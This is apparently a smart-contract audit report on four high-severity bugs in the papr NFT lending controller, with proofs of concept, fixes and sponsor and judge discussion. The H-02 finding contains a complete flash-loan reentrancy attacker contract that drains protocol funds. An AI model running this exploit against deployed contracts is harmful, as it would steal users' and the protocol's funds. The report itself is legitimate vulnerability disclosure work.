[H-01] Borrowers may earn auction proceeds without filling the debt shortfall
Submitted byhihen, also found bybin2chen,rvierdiiev, andHollaDieWaldfee
The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.
Proof of Concept
Assume N is an allowed NFT, B is a borrower, the vault V is_vaultInfo[B][N]:
B add two NFTs (N-1 and N-2) as collaterals to vault V.BincreaseDebt()of vault V.The vault V becomes liquidatable.Someone callsstartLiquidationAuction()to liquidate collateral N-1.No one buys N-1 because the price of N is falling.AfterliquidationAuctionMinSpacing - 2days, someone callsstartLiquidationAuction()to liquidate collateral N-2.Someone callspurchaseLiquidationAuctionNFTto purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:
if(isLastCollateral&&remaining!=0) {/// there will be debt left with no NFTs, set it to 0_reduceDebtWithoutBurn(auction.nftOwner,auction.auctionAssetContract,remaining);}
Someone callspurchaseLiquidationAuctionNFTto purchase N-2. All the excess will be transferred to B becauseneededToSaveVaultis 0 anddebtCachedis 0:
if(excess>0) {remaining=_handleExcess(excess,neededToSaveVault,debtCached,auction);}
The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.Test code for PoC:
diff--gita/test/paprController/PoC.solb/test/paprController/PoC.solnewfilemode100644index0000000..0b12914--- /dev/null+++b/test/paprController/PoC.sol@@ -0,0+1,147@@+// SPDX-License-Identifier: GPL-2.0-or-later+pragmasolidity^0.8.17;++import"forge-std/console.sol";+import{ERC721}from"solmate/tokens/ERC721.sol";++import{ReservoirOracleUnderwriter}from"../../src/ReservoirOracleUnderwriter.sol";+import{INFTEDA}from"../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol";++import{BasePaprControllerTest}from"./BasePaprController.ft.sol";+import{IPaprController}from"../../src/interfaces/IPaprController.sol";++contractPoCisBasePaprControllerTest{+eventReduceDebt(addressindexedaccount,ERC721indexedcollateralAddress,uint256amount);+eventTransfer(addressindexedfrom,addressindexedto,uint256amount);++INFTEDA.Auctionauction1;+INFTEDA.Auctionauction2;+addresspurchaser=address(2);++functionsetUp()publicoverride{+super.setUp();++// mint a second collateral+nft.mint(borrower,collateralId+1);+// add collaterals, loan max and sells+_addCollaterals();+_loanMaxAndSell();+// borrower now has 2.9... USD+assertGt(underlying.balanceOf(borrower),2.9e6);++// prepare purchaser+vm.startPrank(purchaser);+safeTransferReceivedArgs.debt=controller.maxDebt(oraclePrice) -10;+safeTransferReceivedArgs.proceedsTo=purchaser;+safeTransferReceivedArgs.swapParams.minOut=0;+for(uinti=0;i<3;i++) {+nft.mint(purchaser,10+i);+nft.safeTransferFrom(purchaser,address(controller),10+i,abi.encode(safeTransferReceivedArgs));+        }+vm.stopPrank();+// purchaser now has 4.4... papr+assertGt(debtToken.balanceOf(purchaser),4.4e18);++// make max loan liquidatable+vm.warp(block.timestamp+1days);+priceKind=ReservoirOracleUnderwriter.PriceKind.TWAP;+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+    }++functiontestPoC()public{+vm.startPrank(purchaser);+debtToken.approve(address(controller),type(uint256).max);++// start auction1, collateralId+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+auction1=controller.startLiquidationAuction(borrower,collateral,oracleInfo);++// nobody purchage auction1 for some reason(like nft price falling)++// start auction2, collateralId+1+vm.warp(block.timestamp+controller.liquidationAuctionMinSpacing());+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+auction2=controller.startLiquidationAuction(+borrower,IPaprController.Collateral({id:collateralId+1,addr:nft}),oracleInfo);++IPaprController.VaultInfomemoryinfo=controller.vaultInfo(borrower,collateral.addr);+assertGt(info.debt,2.99e18);++// purchase auction1+uint256beforeBalance=debtToken.balanceOf(borrower);+uint256price=controller.auctionCurrentPrice(auction1);+uint256penalty=price*controller.liquidationPenaltyBips() /1e4;+uint256reduced=price-penalty;+uint256shortfall=info.debt-reduced;+// burn penalty+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),penalty);+// reduce debt (partial)+vm.expectEmit(true,false,false,true);+emitReduceDebt(borrower,collateral.addr,reduced);+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),reduced);+//!! burning the shortfall debt not covered by auction+vm.expectEmit(true,false,false,true);+emitReduceDebt(borrower,collateral.addr,shortfall);+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+controller.purchaseLiquidationAuctionNFT(auction1,price,purchaser,oracleInfo);++// reduced: 0.65..+assertLt(reduced,0.66e18);+// fortfall: 2.34..+assertGt(shortfall,2.34e18);+//!! debt is 0 now+info=controller.vaultInfo(borrower,collateral.addr);+assertEq(info.debt,0);++// purchase auction2+// https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29+vm.warp(block.timestamp+78831);+beforeBalance=debtToken.balanceOf(borrower);+price=controller.auctionCurrentPrice(auction2);+penalty=price*controller.liquidationPenaltyBips() /1e4;+uint256payouts=price-penalty;+// burn penalty+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),penalty);+//!! reduce 0 because debt is 0+vm.expectEmit(true,false,false,true);+emitReduceDebt(borrower,collateral.addr,0);+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),address(0),0);+//!! borrower get the payouts that should be used to reduce the shortfall debt+vm.expectEmit(true,true,false,true);+emitTransfer(address(controller),borrower,payouts);+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+controller.purchaseLiquidationAuctionNFT(auction2,price,purchaser,oracleInfo);++//!! borrower wins+uint256afterBalance=debtToken.balanceOf(borrower);+assertEq(afterBalance-beforeBalance,payouts);+assertGt(payouts,2.4e18);+    }++function_addCollaterals()internal{+vm.startPrank(borrower);+nft.setApprovalForAll(address(controller),true);+IPaprController.Collateral[]memoryc=newIPaprController.Collateral[](2);+c[0] =collateral;+c[1] =IPaprController.Collateral({id:collateralId+1,addr:nft});+controller.addCollateral(c);+vm.stopPrank();+    }++function_loanMaxAndSell()internal{+oracleInfo=_getOracleInfoForCollateral(collateral.addr,underlying);+IPaprController.SwapParamsmemoryswapParams=IPaprController.SwapParams({+amount:controller.maxDebt(oraclePrice*2) -4,+minOut:1,+sqrtPriceLimitX96:_maxSqrtPriceLimit({sellingPAPR:true}),+swapFeeTo:address(0),+swapFeeBips:0+        });+vm.prank(borrower);+controller.increaseDebtAndSell(borrower,collateral.addr,swapParams,oracleInfo);+    }+}
Test output:
Running 1 test for test/paprController/PoC.sol:PoC[PASS] testPoC() (gas: 720941)Test result: ok. 1 passed; 0 failed; finished in 1.21s
Tools Used
VS Code
Recommended Mitigation Steps
The debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.
Implementation code:
diff--gita/src/PaprController.solb/src/PaprController.solindex284b3f4..d7e4cea100644---a/src/PaprController.sol+++b/src/PaprController.sol@@ -61,6+61,8@@contractPaprControlleris/// @dev account => asset => vaultInfomapping(address=>mapping(ERC721=>IPaprController.VaultInfo))private_vaultInfo;+/// @dev account => asset => shortfall amount+mapping(address=>mapping(ERC721=>uint256))private_shortfall;/// @dev does not validate args/// e.g. does not check whether underlying or oracleSigner are address(0)@@ -288,6+290,8@@contractPaprControlleris}if(isLastCollateral&&remaining!=0) {+// increase shortfall+_shortfall[auction.nftOwner][auction.auctionAssetContract] +=remaining;/// there will be debt left with no NFTs, set it to 0_reduceDebtWithoutBurn(auction.nftOwner,auction.auctionAssetContract,remaining);}@@ -408,6+412,10@@contractPaprControllerisreturn_vaultInfo[account][asset];}+functionshortfall(addressaccount,ERC721asset)externalviewreturns(uint256) {+return_shortfall[account][asset];+    }+/// INTERNAL NON-VIEW ///function_addCollateralToVault(addressaccount, IPaprController.Collateralmemorycollateral)internal{@@ -543,7+551,20@@contractPaprControlleris// we owe them more papr than they have in debt// so we pay down debt and send them the rest_reduceDebt(auction.nftOwner,auction.auctionAssetContract,address(this),debtCached);-papr.transfer(auction.nftOwner,totalOwed-debtCached);++uint256payout=totalOwed-debtCached;+uint256burnShortfall=_shortfall[auction.nftOwner][auction.auctionAssetContract];+if(burnShortfall>=payout) {+burnShortfall=payout;+            }+if(burnShortfall>0) {+// burn the previous shortfall+PaprToken(address(papr)).burn(address(this),burnShortfall);+_shortfall[auction.nftOwner][auction.auctionAssetContract] -=burnShortfall;+            }+if(payout>burnShortfall) {+papr.transfer(auction.nftOwner,payout-burnShortfall);+            }}else{// reduce vault debt_reduceDebt(auction.nftOwner,auction.auctionAssetContract,address(this),totalOwed);
Jeiwan (warden) commented:
State mismanagement causes writing off of a bad debt while there’s still a collateral NFT being auctioned. As a result, the proceedings of the auction are not used to repay the bad debt and are sent directly to the debtor.
wilsoncusack (Backed) confirmed and commented:
Agree with @Jeiwan. TheisLastCollateralcheck should also check whether there is another auction ongoing:https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L525-L527

[H-02] Stealing fund by applying reentrancy attack onremoveCollateral,startLiquidationAuction, andpurchaseLiquidationAuctionNFT
Submitted byHE1M, also found byunforgiven,hihen,rvierdiiev, andBobface
By applying reentrancy attack involving the functionsremoveCollateral,startLiquidationAuction, andpurchaseLiquidationAuctionNFT, an Attacker can steal large amount of funds.
Proof of Concept
Bob (a malicious user) deploys a contract to apply the attack. This contract is calledBobContract. Please note that all the following transactions are going to be done in one transaction.BobContract takes a flash loan of 500K USDC.BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has a price of almost 50K USDC.BobContract adds those NFTs as collateral by calling the functionaddCollateral. So_vaultInfo[BobContract][collateral.addr].count = 10.
function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {for (uint256 i = 0; i < collateralArr.length;) {_addCollateralToVault(msg.sender, collateralArr[i]);collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);unchecked {++i;}}}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98
BobContract borrows the max allowed amount ofPaprTokenthat is almost equivalent to 250K USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the functionincreaseDebt.
function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {if (_lastUpdated == block.timestamp) {return _maxDebt(totalCollateraValue, _target);}return _maxDebt(totalCollateraValue, newTarget());}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393
function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;return maxLoanUnderlying / cachedTarget;}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556
function increaseDebt(address mintTo,ERC721 asset,uint256 amount,ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo) external override {_increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138
BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 1050k50% = 250k.BobContract intends to call the functionremoveCollateral. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 950k50%).
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109
Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function_removeCollateral, thesafeTransferFromcallbacks the BobContract.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444
https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120
In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the functionstartLiquidationAuctionto put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and_vaultInfo[BobContract][collateral.addr].count = 1. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 150k50% = 25k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297
After calling the functionstartLiquidationAuction, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps,info.count = 1, so debt is larger than max debt.
if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {revert IPaprController.NotLiquidatable();}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317
Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so_vaultInfo[msg.sender][collateral.addr].count = 0. Moreover, the starting price for this NFT will be3*oraclePrice(because theauctionStartPriceMultiplier = 3), so it will be almost 3 * 50k = 150k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341
BobContract calls the functionpurchaseLiquidationAuctionNFTto buy it’s own NFT with id 10 which is priced at almost 150k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264
In this function, we have the followoing variables:collateralValueCached= 150k * 0 = 0isLastCollateral= TRUEdebtCached= 250k (same as before)maxDebtCached= 250kneededToSaveVault= 0price= 150k Please note that the functions_purchaseNFTAndUpdateVaultIfNeededand_purchaseNFTare called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72
excess= 150k Since it is larger than zero, the function_handleExcessis called.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532
fee= 15k Considering 10% fee on the excesscredit= 135ktotalOwed= 135k Since this is smaller thandebtCaches250k, the function_reduceDebtis called to reduce debt from 250k to 115k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549
remaining= 115kAll the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, 115k remains as debt.In the last part of the functionpurchaseLiquidationAuctionNFT, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored.
if (isLastCollateral && remaining != 0) {/// there will be debt left with no NFTs, set it to 0_reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290
Now, the control returns back to the contractPaprController. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed.
if (debt > max) {revert IPaprController.ExceedsMaxDebt(debt, max);}
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449
Now that the attack is finished, BobContract repays the flash loan after selling those 10 NFTs.Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob’s profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.In order to take profit and steal funds, the attacker at least should add 7 NFTs as collateral and borrow the max debt. BecausenumberOfNFT * oraclePrice * 50% > oraclePrice * 3
In the following PoC, I am showing how the attack can be applied.
Bob deploys the following contract and calls the functionattack(). It takes flash loan from AAVE, then the callback from the AAVE will executeexecuteOperation. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.
Then, it borrows max debt which is almost 250k, and remove the NFT with id 1.
In the callback ofsafeTransferFrom, the functiononERC721Receivedis called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.
When NFTs with id 9 is removed, the functionstartLiquidationAuctionis called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.
// SPDX-License-Identifier: MITpragma solidity 0.8.0;interface ERC721 {}interface ERC20 {}struct Collateral {ERC721 addr;uint256 id;}struct OracleInfo {Message message;Sig sig;}struct Message {bytes32 id;bytes payload;uint256 timestamp;bytes signature;}struct Sig {uint8 v;bytes32 r;bytes32 s;}struct Auction {address nftOwner;uint256 auctionAssetID;ERC721 auctionAssetContract;uint256 perPeriodDecayPercentWad;uint256 secondsInPeriod;uint256 startPrice;ERC20 paymentAsset;}enum PriceKind {SPOT,TWAP,LOWER,UPPER}interface IPaprController {function addCollateral(Collateral[] calldata collateral) external;function increaseDebt(address mintTo,ERC721 asset,uint256 amount,OracleInfo calldata oracleInfo) external;function removeCollateral(address sendTo,Collateral[] calldata collateralArr,OracleInfo calldata oracleInfo) external;function startLiquidationAuction(address account,Collateral calldata collateral,OracleInfo calldata oracleInfo) external returns (Auction memory auction);function purchaseLiquidationAuctionNFT(Auction calldata auction,uint256 maxPrice,address sendTo,OracleInfo calldata oracleInfo) external;function maxDebt(uint256 totalCollateraValue)externalviewreturns (uint256);function underwritePriceForCollateral(ERC721 asset,PriceKind priceKind,OracleInfo memory oracleInfo) external returns (uint256);}interface IFundingRateController {function updateTarget() external returns (uint256);}interface IAAVE {function flashLoanSimple(address receiverAddress,address asset,uint256 amount,bytes calldata params,uint16 referralCode) external;}contract BobContract {IPaprController iPaprController;IFundingRateController iFundingRateController;IAAVE iAAVE;ERC721 nftCollectionAddress;ERC20 paprToken;Collateral[] collaterals;OracleInfo oracleInfo;uint256 numOfCallback;address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;constructor(address _paprControllerAddress,address _fundingRateControllerAddress,address _aaveAddress,ERC721 _nftCollectionAddress,OracleInfo memory _oracleInfo,ERC20 _paprToken) {iPaprController = IPaprController(_paprControllerAddress);iFundingRateController = IFundingRateController(_fundingRateControllerAddress);iAAVE = IAAVE(_aaveAddress);nftCollectionAddress = _nftCollectionAddress;oracleInfo = _oracleInfo;paprToken = _paprToken;}function attack() public {///// STEP1: taking flash loaniAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, "", 0);}function executeOperation(address[] calldata assets,uint256[] calldata amounts,uint256[] calldata premiums,address initiator,bytes calldata params) external returns (bool) {///// STEP2: buying 10 NFTs// Buy 10 NFTs that each worths almost 50k// Assume the ids are from 1 to 10///// STEP3: adding the NFTs as collateralfor (uint256 i = 0; i < 10; ++i) {collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));}iPaprController.addCollateral(collaterals);///// STEP4: borrowing as much as possibleuint256 oraclePrice = iPaprController.underwritePriceForCollateral(nftCollectionAddress,PriceKind.LOWER,oracleInfo);uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);iPaprController.increaseDebt(address(this),nftCollectionAddress,maxDebt,oracleInfo);///// STEP5: removing the NFT with id 1Collateral[] memory collateralArr = new Collateral[](1);collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});iPaprController.removeCollateral(address(this),collateralArr,oracleInfo);///// STEP16: selling 10 NFTs and repaying the flash loan// Selling the 10 NFTs// Repaying the flash loan}function onERC721Received(address from,address,uint256 _id,bytes calldata data) external returns (bytes4) {numOfCallback++;if (numOfCallback < 9) {///// STEP6 - STEP13: removing the NFTs with id 2 to 9Collateral[] memory collateralArr = new Collateral[](1);collateralArr[0] = Collateral({addr: nftCollectionAddress,id: _id + 1});iPaprController.removeCollateral(address(this),collateralArr,oracleInfo);} else {///// STEP14: starting the auction for NFT with id 10Collateral memory lastCollateral = Collateral({addr: nftCollectionAddress,id: _id + 1});iPaprController.startLiquidationAuction(address(this),lastCollateral,oracleInfo);///// STEP15: buying the NFT with id 10 on the auctionuint256 oraclePrice = iPaprController.underwritePriceForCollateral(nftCollectionAddress,PriceKind.LOWER,oracleInfo);uint256 startPrice = (oraclePrice * 3 * 1e18) /iFundingRateController.updateTarget();Auction memory auction = Auction({nftOwner: address(this),auctionAssetID: 10,auctionAssetContract: nftCollectionAddress,perPeriodDecayPercentWad: 0.7e18,secondsInPeriod: 1 days,startPrice: startPrice,paymentAsset: paprToken});iPaprController.purchaseLiquidationAuctionNFT(auction,startPrice,address(this),oracleInfo);}}}
Recommended Mitigation Steps
Adding a reentrancy guard to the involved functions can be a solution.
wilsoncusack (Backed) confirmed and commented:
There is actually a simpler attack here: add one NFT and borrow max debt. Start Liquidation auction and purchase. On purchase reenter via safeTransferFrom and add many more NFTs, borrowing max. Purchase thinks this is the borrowers last NFT and debt is set to 0. Now borrower can withdraw all other NFTs for free.We could:change removeCollateral to have the debt check BEFORE we send the NFT out, which would prevent sell to repay flowsadd a reentrancy guard on startAuction so that it can’t be composed with others.add a reentrancy guard on purchase so that it can’t be composed with others

[H-03] Collateral NFT deposited to a wrong address, when transferred directly toPaprController
Submitted byJeiwan, also found byKoolex,Ruhum, androtcivegaf
Users will lose collateral NFTs when they are transferred toPaprControllerby an approved address or an operator.
Proof of Concept
ThePaprControllerallows users to deposit NFTs as collateral to borrow Papr tokens. One way of depositing is by transferring an NFT to the contract directly via a call tosafeTransferFrom: the contract implements theonERC721Receivedhook that will handle accounting of the transferred NFT (PaprController.sol#L159). However, the hook implementation uses a wrong argument to identify token owner: the first argument, which is used by the contract to identify token owner, is the address of thesafeTransferFromfunction caller, which may be an approved address or an operator. The actual owner address is the second argument (ERC721.sol#L436):
tryIERC721Receiver(to).onERC721Received(_msgSender(),from,tokenId,data)returns(bytes4retval) {
Thus, when an NFT is sent by an approved address or an operator, it’ll be deposited to the vault of the approved address or operator:
// test/paprController/OnERC721ReceivedTest.solfunctiontestSafeTransferByOperator_AUDIT()public{addressoperator=address(0x12345);vm.prank(borrower);nft.setApprovalForAll(operator,true);vm.prank(operator);nft.safeTransferFrom(borrower,address(controller),collateralId,abi.encode(safeTransferReceivedArgs));// NFT was deposited to the operator's vault.IPaprController.VaultInfomemoryvaultInfo=controller.vaultInfo(operator,collateral.addr);assertEq(vaultInfo.count,1);// Borrower has 0 tokens in collateral.vaultInfo=controller.vaultInfo(borrower,collateral.addr);assertEq(vaultInfo.count,0);}functiontestSafeTransferByApproved_AUDIT()public{addressapproved=address(0x12345);vm.prank(borrower);nft.approve(approved,collateralId);vm.prank(approved);nft.safeTransferFrom(borrower,address(controller),collateralId,abi.encode(safeTransferReceivedArgs));// NFT was deposited to the approved address's vault.IPaprController.VaultInfomemoryvaultInfo=controller.vaultInfo(approved,collateral.addr);assertEq(vaultInfo.count,1);// Borrower has 0 tokens in collateral.vaultInfo=controller.vaultInfo(borrower,collateral.addr);assertEq(vaultInfo.count,0);}
Recommended Mitigation Steps
Consider this change:
--- a/src/PaprController.sol+++ b/src/PaprController.sol@@ -156,7 +156,7 @@ contract PaprController is/// @param _id the id of the NFT/// @param data encoded IPaprController.OnERC721ReceivedArgs/// @return selector indicating succesful receiving of the NFT-    function onERC721Received(address from, address, uint256 _id, bytes calldata data)+    function onERC721Received(address, address from, uint256 _id, bytes calldata data)externaloverridereturns (bytes4)
wilsoncusack (Backed) confirmed

[H-04] Users may be liquidated right after taking maximal debt
Submitted byJeiwan
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317
Impact
Since there’s no gap between the maximal LTV and the liquidation LTV, user positions may be liquidated as soon as maximal debt is taken, without leaving room for collateral and Papr token prices fluctuations. Users have no chance to add more collateral or reduce debt before being liquidated. This may eventually create more uncovered and bad debt for the protocol.
Proof of Concept
The protocol allows users to take debt up to the maximal debt, including it (PaprController.sol#L471):
if(newDebt>max)revertIPaprController.ExceedsMaxDebt(newDebt,max);
However, a position becomes liquidable as soon as user’s debt reaches user’s maximal debt (PaprController.sol#L317):
if(info.debt<_maxDebt(oraclePrice*info.count,cachedTarget)) {revertIPaprController.NotLiquidatable();}
Moreover, the same maximal debt calculation is used during borrowing and liquidating, with the same maximal LTV (PaprController.sol#L556-L559):
function_maxDebt(uint256totalCollateraValue,uint256cachedTarget)internalviewreturns(uint256) {uint256maxLoanUnderlying=totalCollateraValue*maxLTV;returnmaxLoanUnderlying/cachedTarget;}
Even though different price kinds are used during borrowing and liquidations (LOWER during borrowing,TWAP during liquidations), the price can in fact match (ReservoirOracleUnderwriter.sol#L11):
/// @dev LOWER is the minimum of SPOT and TWAP
Which means that the difference in prices doesn’t always create a gap in maximal and liquidation LTVs.
The combination of these factors allows users to take maximal debts and be liquidated immediately, in the same block. Since liquidations are not beneficial for lending protocols, such heavy penalizing of users may harm the protocol and increase total uncovered debt, and potentially lead to a high bad debt.
// test/paprController/IncreaseDebt.t.soleventRemoveCollateral(addressindexedaccount,ERC721indexedcollateralAddress,uint256indexedtokenId);functiontestIncreaseDebtAndBeLiquidated_AUDIT()public{vm.startPrank(borrower);nft.approve(address(controller),collateralId);IPaprController.Collateral[]memoryc=newIPaprController.Collateral[](1);c[0] =collateral;controller.addCollateral(c);// Calculating the max debt for the borrower.uint256maxDebt=controller.maxDebt(1*oraclePrice);// Taking the maximal debt.vm.expectEmit(true,true,false,true);emitIncreaseDebt(borrower,collateral.addr,maxDebt);controller.increaseDebt(borrower,collateral.addr,maxDebt,oracleInfo);vm.stopPrank();// Making a TWAP price that's identical to the LOWER one.priceKind=ReservoirOracleUnderwriter.PriceKind.TWAP;ReservoirOracleUnderwriter.OracleInfomemorytwapOracleInfo=_getOracleInfoForCollateral(nft,underlying);// The borrower is liquidated in the same block.vm.expectEmit(true,true,false,false);emitRemoveCollateral(borrower,collateral.addr,collateral.id);controller.startLiquidationAuction(borrower,collateral,twapOracleInfo);}
Recommended Mitigation Steps
Consider adding a liquidation LTV that’s bigger than the maximal borrow LTV; positions can only be liquidated after reaching the liquidation LTV. This will create a room for price fluctuations and let users increase their collateral or decrease debt before being liquidating.
Alternatively, consider liquidating positions only after their debt has increased the maximal one:
--- a/src/PaprController.sol+++ b/src/PaprController.sol@@ -314,7 +314,7 @@ contract PaprController isuint256 oraclePrice =underwritePriceForCollateral(collateral.addr, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo);-        if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {+        if (info.debt <= _maxDebt(oraclePrice * info.count, cachedTarget)) {revert IPaprController.NotLiquidatable();}
wilsoncusack (Backed) disagreed with severity and commented:
I agree we should change this to a<PaprController.sol#L471. But I do not see this as High severity, I don’t think.Even with that changed, it is possible to be liquidated in the same block due to Target changing or a new oracle price. I think this is the norm for other lending protocols, e.g. I believe with Compound or Maker you could be liquidated in the same block if you max borrow and the oracle price is updated in the same block?
Jeiwan (warden) commented:
Other lending protocols, like Compound, Maker, and Aave, have different LTV thresholds. For example,AAVEMax LTV is the maximal debt and Liquidation threshold is the liquidation LTV. Users may borrow until max LTV but they’re liquidated only after reaching the liquidation LTV. In the case of ETH, max LTV on AAVE is 82.50% and Liquidation threshold is 86.00%. The difference allows price and collateral value fluctuations, and it depends on the risk profile of an asset. For example, it’s 13% forLINKThis difference protects users from liquidations caused by high volatility.This is a high finding because users lose funds during liquidations and every liquidation may create bad debt for the protocol. Liquidations are harmful for both protocols and users, so lending protocols shouldn’t allow users to borrow themselves right into liquidations.
wilsoncusack (Backed) commented:
Thanks! TIL. My main reference was squeeth and there you can borrow right up to max (unless I miss something, again). Will consider making this change!
trust1995 (judge) commented:
Because warden has demonstrated there is potentially no gap between liquidation LTV and borrow LTV, will treat this as HIGH impact. If the gap was even 1 wei I believe it would be a MEDIUM find, but the current code incentivizes MEV bots liquidating max debt positions in the same block.

